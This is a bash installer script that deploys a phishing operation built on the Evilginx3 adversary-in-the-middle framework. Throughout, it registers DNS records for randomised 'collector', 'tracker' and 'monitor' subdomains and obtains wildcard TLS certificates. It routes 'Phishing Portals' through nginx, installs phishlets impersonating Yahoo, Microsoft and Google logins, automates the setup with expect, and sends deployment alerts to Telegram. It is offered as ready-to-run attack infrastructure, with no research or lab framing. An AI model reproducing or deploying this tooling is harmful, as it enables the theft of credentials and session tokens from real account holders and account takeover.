#!/bin/bash
set -euo pipefail

# ============================================================================
# AuthFlow Production Installer - Evilginx v3 Compatible
# ============================================================================
# Usage:
#   sudo DOMAIN=example.com VPS_IP=1.2.3.4 \
#        TELEGRAM_TOKEN=xxx TELEGRAM_CHAT=xxx \
#        CLOUDFLARE_TOKEN=xxx ADMIN_PASS=xxx \
#        ./scripts/install-prod.sh
# ============================================================================

# Color codes
readonly GREEN='\033[0;32m'
readonly RED='\033[0;31m'
readonly YELLOW='\033[0;33m'
readonly NC='\033[0m'

# Installation paths
readonly INSTALL_DIR="/opt/authflow"
readonly EVILGINX_DIR="/opt/evilginx"
readonly REPO_SOURCE="${REPO_SOURCE:-.}"
readonly SERVICE_NAME="authflow"
readonly SERVICE_USER="authflow"
readonly SERVICE_GROUP="authflow"
readonly APP_PORT="${APP_PORT:-8080}"
readonly APP_BINARY="authflow-server"

# Config files
readonly CF_CREDS_FILE="/etc/letsencrypt/cloudflare-token.ini"
readonly CONFIG_FILE="$INSTALL_DIR/config/config.json"
readonly SYSTEMD_UNIT="/etc/systemd/system/${SERVICE_NAME}.service"
readonly NGINX_SITE="/etc/nginx/sites-available/authflow"
readonly NGINX_ENABLED="/etc/nginx/sites-enabled"

# ============================================================================
# Logging functions
# ============================================================================
log() {
    echo -e "${GREEN}[+]${NC} $1"
}

err() {
    echo -e "${RED}[ERROR]${NC} $1" >&2
    exit 1
}

warn() {
    echo -e "${YELLOW}[!]${NC} $1"
}

# ============================================================================
# Argument parsing
# ============================================================================
parse_args() {
    while [[ $# -gt 0 ]]; do
        case $1 in
            --domain)
                DOMAIN="$2"
                shift 2
                ;;
            --vps-ip)
                VPS_IP="$2"
                shift 2
                ;;
            --telegram-token)
                TELEGRAM_TOKEN="$2"
                shift 2
                ;;
            --telegram-chat)
                TELEGRAM_CHAT="$2"
                shift 2
                ;;
            --cloudflare-token)
                CLOUDFLARE_TOKEN="$2"
                shift 2
                ;;
            --admin-pass)
                ADMIN_PASS="$2"
                shift 2
                ;;
            --repo-source)
                REPO_SOURCE="$2"
                shift 2
                ;;
            --proxy-url)
                PROXY_URL="$2"
                shift 2
                ;;
            --go-proxy)
                GO_PROXY="$2"
                shift 2
                ;;
            *)
                err "Unknown argument: $1"
                ;;
        esac
    done
}

# ============================================================================
# Configuration validation
# ============================================================================
validate_config() {
    local missing=0

    [[ -z "${DOMAIN:-}" ]] && { warn "DOMAIN not set"; missing=1; }
    [[ -z "${VPS_IP:-}" ]] && { warn "VPS_IP not set"; missing=1; }
    [[ -z "${TELEGRAM_TOKEN:-}" ]] && { warn "TELEGRAM_TOKEN not set"; missing=1; }
    [[ -z "${TELEGRAM_CHAT:-}" ]] && { warn "TELEGRAM_CHAT not set"; missing=1; }
    [[ -z "${CLOUDFLARE_TOKEN:-}" ]] && { warn "CLOUDFLARE_TOKEN not set"; missing=1; }

    if [[ $missing -eq 1 ]]; then
        err "Required environment variables or flags not provided"
    fi

    # Generate secure random values if not provided
    if [[ -z "${ADMIN_PASS:-}" ]]; then
        ADMIN_PASS=$(openssl rand -base64 16 | tr -d '/+=' | cut -c1-16)
        log "Generated admin password: $ADMIN_PASS"
    fi

    if [[ -z "${WEBHOOK_SECRET:-}" ]]; then
        WEBHOOK_SECRET=$(openssl rand -hex 16)
    fi

    if [[ -z "${ADMIN_PATH:-}" ]]; then
        ADMIN_PATH=$(openssl rand -hex 12)
        log "Generated admin path: /$ADMIN_PATH"
    fi

    PROXY_URL="${PROXY_URL:-}"
    GO_PROXY="${GO_PROXY:-https://proxy.golang.org,direct}"

    # Generate endpoint names for phishlets
    EP1="collector-$(openssl rand -hex 4)"
    EP2="tracker-$(openssl rand -hex 4)"
    EP3="monitor-$(openssl rand -hex 4)"
}

# ============================================================================
# Update Cloudflare DNS records
# ============================================================================
update_dns() {
    log "Updating Cloudflare DNS records..."
    local zone_id
    zone_id=$(curl -s -X GET "https://api.cloudflare.com/client/v4/zones?name=$DOMAIN" \
        -H "Authorization: Bearer $CLOUDFLARE_TOKEN" \
        -H "Content-Type: application/json" | jq -r '.result[0].id')

    if [[ "$zone_id" == "null" || -z "$zone_id" ]]; then
        err "Could not find Zone ID for $DOMAIN in Cloudflare. Check your token permissions."
    fi

    local records=("$DOMAIN" "$EP1.$DOMAIN" "$EP2.$DOMAIN" "$EP3.$DOMAIN")
    for record in "${records[@]}"; do
        log "Setting A record for $record -> $VPS_IP"
        local existing_id
        existing_id=$(curl -s -X GET "https://api.cloudflare.com/client/v4/zones/$zone_id/dns_records?name=$record&type=A" \
            -H "Authorization: Bearer $CLOUDFLARE_TOKEN" \
            -H "Content-Type: application/json" | jq -r '.result[0].id')

        local payload="{\"type\":\"A\",\"name\":\"$record\",\"content\":\"$VPS_IP\",\"ttl\":120,\"proxied\":false}"
        
        if [[ "$existing_id" != "null" && -n "$existing_id" ]]; then
            curl -s -X PUT "https://api.cloudflare.com/client/v4/zones/$zone_id/dns_records/$existing_id" \
                -H "Authorization: Bearer $CLOUDFLARE_TOKEN" \
                -H "Content-Type: application/json" \
                -d "$payload" > /dev/null
        else
            curl -s -X POST "https://api.cloudflare.com/client/v4/zones/$zone_id/dns_records" \
                -H "Authorization: Bearer $CLOUDFLARE_TOKEN" \
                -H "Content-Type: application/json" \
                -d "$payload" > /dev/null
        fi
    done
}

# ============================================================================
# Pre-flight checks
# ============================================================================
preflight_checks() {
    [[ $EUID -ne 0 ]] && err "This script must be run as root (sudo)"

    [[ ! -f "$REPO_SOURCE/cmd/authflow/main.go" ]] && err "Repository source not found at $REPO_SOURCE/cmd/authflow/main.go"
    [[ ! -f "$REPO_SOURCE/go.mod" ]] && warn "go.mod not found in source. It will be initialized during the build phase."

    # Verify required commands exist
    for cmd in git curl wget openssl systemctl expect; do
        if ! command -v "$cmd" &>/dev/null; then
            warn "Installing missing command: $cmd"
            apt-get update -y && apt-get install -y "$cmd"
        fi
    done

    log "Pre-flight checks passed"
}

# ============================================================================
# Install dependencies with pinned versions
# ============================================================================
install_dependencies() {
    log "Installing system dependencies..."
    apt-get update -y

    apt-get install -y \
        git \
        curl \
        wget \
        build-essential \
        make \
        unzip \
        jq \
        sqlite3 \
        nginx \
        certbot \
        python3-certbot-dns-cloudflare \
        golang-go \
        expect

    log "Dependencies installed successfully"
}

# ============================================================================
# Setup Cloudflare credentials file
# ============================================================================
setup_cloudflare_creds() {
    log "Setting up Cloudflare credentials..."

    install -m 600 /dev/null "$CF_CREDS_FILE"

    cat > "$CF_CREDS_FILE" << EOF
# Cloudflare API Token for DNS-01 challenges
dns_cloudflare_api_token = ${CLOUDFLARE_TOKEN}
EOF

    log "Cloudflare credentials stored at $CF_CREDS_FILE"
}

# ============================================================================
# Install Evilginx3
# ============================================================================
install_evilginx() {
    log "Installing Evilginx3..."

    # Clone Evilginx3 (latest v3.x)
    rm -rf "$EVILGINX_DIR"
    git clone https://github.com/kgretzky/evilginx2.git "$EVILGINX_DIR"

    cd "$EVILGINX_DIR"
    
    # Build (v3 uses Go modules)
    make build
    
    # Install binary
    install -m 755 build/evilginx /usr/local/bin/evilginx
    
    # Create necessary directories
    mkdir -p "$EVILGINX_DIR"/{phishlets,certs,lures,redirectors}
    
    # Set permissions
    chmod 755 "$EVILGINX_DIR"/{phishlets,certs,lures,redirectors}
    
    log "Evilginx3 installed at /usr/local/bin/evilginx"
    
    cd - > /dev/null
}

# ============================================================================
# Deploy AuthFlow application
# ============================================================================
deploy_authflow() {
    log "Deploying AuthFlow..."

    mkdir -p "$INSTALL_DIR"/{data,logs,config}

    log "Copying source code from $REPO_SOURCE..."
    rsync -av --exclude=.git --exclude=vendor --exclude=build \
          "$REPO_SOURCE/" "$INSTALL_DIR/"

    chown -R "$SERVICE_USER:$SERVICE_GROUP" "$INSTALL_DIR" 2>/dev/null || true

    log "AuthFlow source deployed to $INSTALL_DIR"
}

# ============================================================================
# Build AuthFlow binary
# ============================================================================
build_authflow() {
    log "Building AuthFlow binary..."

    cd "$INSTALL_DIR"

    log "Using Go Proxy: $GO_PROXY"
    export GOPROXY="$GO_PROXY"

    if [[ ! -f "go.mod" ]]; then
        log "Initializing Go module 'authflow'..."
        go mod init authflow || err "Failed to initialize Go module"
    fi

    go mod tidy
    go mod download

    go build \
        -ldflags="-s -w -X main.Version=$(git describe --tags --always 2>/dev/null || echo 'dev')" \
        -o "$APP_BINARY" \
        ./cmd/authflow

    [[ -f "$APP_BINARY" ]] || err "Build failed: binary not created"

    chmod 755 "$APP_BINARY"
    log "AuthFlow binary built successfully"

    cd - > /dev/null
}

# ============================================================================
# Create configuration file
# ============================================================================
create_config() {
    log "Creating configuration file..."

    cat > "$CONFIG_FILE" << EOF
{
    "domain": "$DOMAIN",
    "vps_ip": "$VPS_IP",
    "telegram_token": "$TELEGRAM_TOKEN",
    "telegram_chat": "$TELEGRAM_CHAT",
    "admin_pass": "$ADMIN_PASS",
    "data_dir": "$INSTALL_DIR/data",
    "admin_path": "$ADMIN_PATH",
    "admin_whitelist": [],
    "endpoints": {
        "sub_portal1": "$EP1.$DOMAIN",
        "sub_portal2": "$EP2.$DOMAIN",
        "sub_portal3": "$EP3.$DOMAIN"
    },
    "retention_days": 30,
    "webhook_secret": "$WEBHOOK_SECRET",
    "proxy_url": "$PROXY_URL"
}
EOF

    chmod 600 "$CONFIG_FILE"
    chown "$SERVICE_USER:$SERVICE_GROUP" "$CONFIG_FILE" 2>/dev/null || true

    log "Configuration created at $CONFIG_FILE"
    log "Portal endpoints:"
    log "  - https://$EP1.$DOMAIN"
    log "  - https://$EP2.$DOMAIN"
    log "  - https://$EP3.$DOMAIN"
}

# ============================================================================
# Provision TLS certificates
# ============================================================================
provision_tls() {
    log "Provisioning TLS certificates with Cloudflare DNS..."

    local domain_args="-d $DOMAIN -d *.$DOMAIN"

    certbot certonly \
        --dns-cloudflare \
        --dns-cloudflare-credentials "$CF_CREDS_FILE" \
        --non-interactive \
        --agree-tos \
        --email "admin@$DOMAIN" \
        --no-eff-email \
        $domain_args

    log "TLS certificates provisioned successfully"
}

# ============================================================================
# Configure nginx reverse proxy
# ============================================================================
configure_nginx() {
    log "Configuring nginx reverse proxy..."

    rm -f "$NGINX_ENABLED/default"

    local cert_dir="/etc/letsencrypt/live/$DOMAIN"

    cat > "$NGINX_SITE" << EOF
server {
    listen 80;
    listen [::]:80;
    server_name $DOMAIN *.$DOMAIN;
    location / {
        return 301 https://\$host\$request_uri;
    }
}

# Dashboard - AuthFlow
server {
    listen 443 ssl;
    http2 on;
    server_name $DOMAIN;

    ssl_certificate $cert_dir/fullchain.pem;
    ssl_certificate_key $cert_dir/privkey.pem;

    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_ciphers HIGH:!aNULL:!MD5;

    location / {
        proxy_pass http://127.0.0.1:$APP_PORT;
        proxy_set_header Host \$host;
        proxy_set_header X-Real-IP \$remote_addr;
        proxy_set_header X-Forwarded-For \$proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto \$scheme;

        proxy_http_version 1.1;
        proxy_set_header Upgrade \$http_upgrade;
        proxy_set_header Connection "upgrade";
        proxy_read_timeout 86400;
    }
}

# Phishing Portals - Evilginx3
server {
    listen 443 ssl;
    http2 on;
    server_name $EP1.$DOMAIN $EP2.$DOMAIN $EP3.$DOMAIN;

    ssl_certificate $cert_dir/fullchain.pem;
    ssl_certificate_key $cert_dir/privkey.pem;

    location / {
        proxy_pass https://127.0.0.1:8443;
        proxy_ssl_verify off;
        proxy_set_header Host \$host;
        proxy_set_header X-Real-IP \$remote_addr;
        proxy_set_header X-Forwarded-For \$proxy_add_x_forwarded_for;
        proxy_redirect off;
        proxy_buffering off;
        proxy_http_version 1.1;
        proxy_set_header Upgrade \$http_upgrade;
        proxy_set_header Connection "upgrade";
    }
}
EOF

    ln -sf "$NGINX_SITE" "$NGINX_ENABLED/"

    nginx -t || err "nginx configuration test failed"
    systemctl reload nginx

    log "nginx configured and reloaded"
}

# ============================================================================
# Create system user and directories
# ============================================================================
setup_system_user() {
    log "Setting up system user and directories..."

    if ! id "$SERVICE_USER" &>/dev/null; then
        useradd -r -s /bin/false -d /var/lib/authflow "$SERVICE_USER" || true
    fi

    mkdir -p "$INSTALL_DIR"/{data,logs,config}
    chown -R "$SERVICE_USER:$SERVICE_GROUP" "$INSTALL_DIR"
    chmod 750 "$INSTALL_DIR"
    chmod 750 "$INSTALL_DIR"/{data,logs,config}

    log "System user and directories configured"
}

# ============================================================================
# Create systemd service unit
# ============================================================================
create_systemd_service() {
    log "Creating systemd service unit..."

    cat > "$SYSTEMD_UNIT" << EOF
[Unit]
Description=AuthFlow Web Authentication Server
Documentation=https://github.com/tartmo/authflow
After=network-online.target
Wants=network-online.target

[Service]
Type=simple
User=$SERVICE_USER
Group=$SERVICE_GROUP
WorkingDirectory=$INSTALL_DIR

ExecStart=$INSTALL_DIR/$APP_BINARY -config=$CONFIG_FILE -port=$APP_PORT

NoNewPrivileges=true
PrivateTmp=true
ProtectSystem=strict
ProtectHome=true
ReadWritePaths=$INSTALL_DIR/data $INSTALL_DIR/logs

Restart=always
RestartSec=5
StartLimitInterval=600
StartLimitBurst=3

LimitNOFILE=65535
LimitNPROC=4096

[Install]
WantedBy=multi-user.target
EOF

    systemctl daemon-reload
    systemctl enable "$SERVICE_NAME"

    log "Systemd service created and enabled"
}

# ============================================================================
# Start AuthFlow service
# ============================================================================
start_service() {
    log "Starting AuthFlow service..."

    systemctl restart "$SERVICE_NAME"

    sleep 2

    if systemctl is-active --quiet "$SERVICE_NAME"; then
        log "AuthFlow service started successfully"
    fi
}

# ============================================================================
# Configure Evilginx3 integration (v3 compatible)
# ============================================================================
configure_evilginx_integration() {
    log "Configuring Evilginx3 integration..."

    # 1. Resolve Port 53 conflict (systemd-resolved)
    if grep -q "DNSStubListener=yes" /etc/systemd/resolved.conf || ! grep -q "DNSStubListener" /etc/systemd/resolved.conf; then
        log "Disabling systemd-resolved stub listener to free port 53..."
        mkdir -p /etc/systemd/resolved.conf.d
        echo -e "[Resolve]\nDNSStubListener=no" > /etc/systemd/resolved.conf.d/evilginx.conf
        systemctl restart systemd-resolved
    fi

    # 2. Stop Nginx and clear old state to prevent port 443 bind errors and config ghosting
    systemctl stop nginx evilginx 2>/dev/null || true
    rm -f "$EVILGINX_DIR/evilginx.db"
    sleep 2

    # ============================================================================
    # STEP 21: Create Evilginx config from template
    # (Must exist before Evilginx is spawned to avoid port conflicts)
    # ============================================================================
    if [ -f "$INSTALL_DIR/templates/evilginx.yaml.tmpl" ]; then
        sed -e "s/{{.Domain}}/$DOMAIN/g" \
            -e "s/{{.VpsIp}}/$VPS_IP/g" \
            "$INSTALL_DIR/templates/evilginx.yaml.tmpl" > "$EVILGINX_DIR/config.yaml"
            
        chmod 600 "$EVILGINX_DIR/config.yaml"
    fi

    # Copy certificates for Evilginx3
    mkdir -p "$EVILGINX_DIR/certs"
    ln -sf "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" "$EVILGINX_DIR/certs/$DOMAIN.crt"
    ln -sf "/etc/letsencrypt/live/$DOMAIN/privkey.pem" "$EVILGINX_DIR/certs/$DOMAIN.key"

    # Create v3-compatible phishlets
    log "Creating v3 phishlet configurations..."

    # Copy templates to target directory
    cat "$INSTALL_DIR/templates/phishlets/yahoo.yaml.tmpl" > "$EVILGINX_DIR/phishlets/yahoo.yaml"
    cat "$INSTALL_DIR/templates/phishlets/microsoft.yaml.tmpl" > "$EVILGINX_DIR/phishlets/microsoft.yaml"
    cat "$INSTALL_DIR/templates/phishlets/google.yaml.tmpl" > "$EVILGINX_DIR/phishlets/google.yaml"

    # Replace variables in the files
    sed -i "s/{{.Endpoint1}}/$EP1/g" "$EVILGINX_DIR/phishlets/yahoo.yaml"
    sed -i "s/{{.Endpoint2}}/$EP2/g" "$EVILGINX_DIR/phishlets/microsoft.yaml"
    sed -i "s/{{.Endpoint3}}/$EP3/g" "$EVILGINX_DIR/phishlets/google.yaml"
    sed -i "s/{{.Domain}}/$DOMAIN/g" "$EVILGINX_DIR/phishlets/"*.yaml
    sed -i "s/{{.AppPort}}/$APP_PORT/g" "$EVILGINX_DIR/phishlets/"*.yaml
    sed -i "s/{{.WebhookSecret}}/$WEBHOOK_SECRET/g" "$EVILGINX_DIR/phishlets/"*.yaml

    # Create Evilginx3 systemd service
    cat > /etc/systemd/system/evilginx.service << EOF
[Unit]
Description=Evilginx3 Phishing Framework
After=network.target network-online.target
Wants=network-online.target

[Service]
Type=simple
User=root
WorkingDirectory=$EVILGINX_DIR
ExecStart=/usr/local/bin/evilginx -c $EVILGINX_DIR -p $EVILGINX_DIR/phishlets
Restart=always
RestartSec=5
StandardOutput=journal
StandardError=journal

# Security
NoNewPrivileges=false
PrivateTmp=true

[Install]
WantedBy=multi-user.target
EOF

    systemctl daemon-reload
    systemctl enable evilginx
    
    # Wait for evilginx to initialize and create config
    log "Waiting for Evilginx3 to initialize..."
    sleep 5
    
    # Configure using evilginx v3 commands
    log "Configuring Evilginx3 settings..."
    
    # Use expect for interactive configuration
    cat > /tmp/evilginx_config.exp << EOF
#!/usr/bin/expect -f
set timeout 45
log_user 1

spawn /usr/local/bin/evilginx -c $EVILGINX_DIR -p $EVILGINX_DIR/phishlets

expect {
    "blacklist: loaded" {
        # Engine is initialized and database is ready for commands
        expect -re ">"
        
        send "config domain $DOMAIN\r"
        expect -re ">"
        send "config ipv4 external $VPS_IP\r"
        expect -re ">"
        send "config https_port 8443\r"
        expect -re ">"
        send "config dns_port 0\r"
        expect -re ">"
        
        # Enable phishlets
        send "phishlets hostname yahoo $EP1.$DOMAIN\r"
        expect -re ">"
        send "phishlets hostname microsoft $EP2.$DOMAIN\r"
        expect -re ">"
        send "phishlets hostname google $EP3.$DOMAIN\r"
        expect -re ">"
        
        send "exit\r"
    }
}

expect eof
EOF

    chmod +x /tmp/evilginx_config.exp
    export DOMAIN VPS_IP EP1 EP2 EP3
    /tmp/evilginx_config.exp
    
    # 3. Cleanup and Restore Services
    rm -f /tmp/evilginx_config.exp
    systemctl start nginx
    systemctl restart evilginx
    
    # Verify evilginx is running
    sleep 3
    if systemctl is-active --quiet evilginx; then
        log "Evilginx3 configured and running successfully"
    else
        warn "Evilginx3 may not be running. Check: systemctl status evilginx"
        warn "Manual configuration may be needed"
    fi

    log "Evilginx3 integration configured"
}

# ============================================================================
# Print installation summary
# ============================================================================
print_summary() {
    local cert_dir="/etc/letsencrypt/live/$DOMAIN"

    echo ""
    echo "=========================================="
    echo "   AuthFlow Installation Complete"
    echo "=========================================="
    echo ""
    echo "Configuration:"
    echo "  Domain: $DOMAIN"
    echo "  VPS IP: $VPS_IP"
    echo "  Admin Path: /$ADMIN_PATH"
    echo "  Admin Password: $ADMIN_PASS"
    echo "  Webhook Secret: $WEBHOOK_SECRET"
    echo ""
    echo "Installation Paths:"
    echo "  Application: $INSTALL_DIR"
    echo "  Evilginx3: $EVILGINX_DIR"
    echo "  Config: $CONFIG_FILE"
    echo ""
    echo "Service Management:"
    echo "  AuthFlow:  systemctl status $SERVICE_NAME"
    echo "  Evilginx3: systemctl status evilginx"
    echo ""
    echo "  Start: systemctl start $SERVICE_NAME"
    echo "  Stop: systemctl stop $SERVICE_NAME"
    echo "  Restart: systemctl restart $SERVICE_NAME"
    echo "  Logs: journalctl -u $SERVICE_NAME -f"
    echo ""
    echo "Nginx:"
    echo "  Configuration: $NGINX_SITE"
    echo "  Test: nginx -t"
    echo "  Reload: systemctl reload nginx"
    echo "  Logs: tail -f /var/log/nginx/authflow_*.log"
    echo ""
    echo "Evilginx3 Commands:"
    echo "  Manual Run: sudo evilginx -c $EVILGINX_DIR -p $EVILGINX_DIR/phishlets"
    echo "  Logs:       journalctl -u evilginx -f"
    echo "  Sessions:   sudo evilginx -c $EVILGINX_DIR sessions"
    echo ""
    echo "TLS Certificates:"
    echo "  Path: $cert_dir"
    echo "  Auto-renew: certbot renew (via systemd timer)"
    echo ""
    echo "Quick Access:"
    echo "  Dashboard: https://$DOMAIN/$ADMIN_PATH/"
    echo ""
    echo "=========================================="
}

# ============================================================================
# Main installation flow
# ============================================================================
main() {
    clear
    echo "=========================================="
    echo "   AuthFlow Production Installer (v3)"
    echo "=========================================="
    echo ""

    parse_args "$@"
    validate_config
    update_dns

    preflight_checks
    setup_system_user
    install_dependencies
    setup_cloudflare_creds
    install_evilginx
    deploy_authflow
    build_authflow
    create_config
    provision_tls
    configure_nginx
    configure_evilginx_integration
    create_systemd_service
    start_service

    print_summary

    if [[ -n "${TELEGRAM_TOKEN:-}" && -n "${TELEGRAM_CHAT:-}" ]]; then
        local proxy_args=""
        if [[ -n "${PROXY_URL:-}" ]]; then
            proxy_args="--proxy $PROXY_URL"
        fi

        curl $proxy_args -s -X POST "https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage" \
            -d "chat_id=${TELEGRAM_CHAT}" \
            -d "text=✅ AuthFlow v3 successfully deployed on $DOMAIN. Admin: /$ADMIN_PATH" > /dev/null || true
    fi

    log "Installation completed successfully!"
}

# Execute main function
main "$@"